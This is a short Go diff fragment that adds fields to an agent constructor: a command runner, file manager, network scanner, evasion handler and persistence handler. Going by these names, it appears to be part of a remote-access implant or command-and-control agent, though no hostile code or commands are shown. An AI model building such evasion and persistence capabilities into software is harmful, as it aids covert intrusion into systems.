@@ -48,3 +48,8 @@ func newAgent(config Config) *Agent {
 		id:          generateID(),
 		config:      config,
 		crypto:      crypto.NewCryptoHandler(config.Key),
+		commander:   commands.NewCommander(),
+		fileMgr:     commands.NewFileManager(),
+		netScanner:  commands.NewNetworkScanner(),
+		evasion:     evasion.NewEvasionHandler(),
+		persistence: ph,
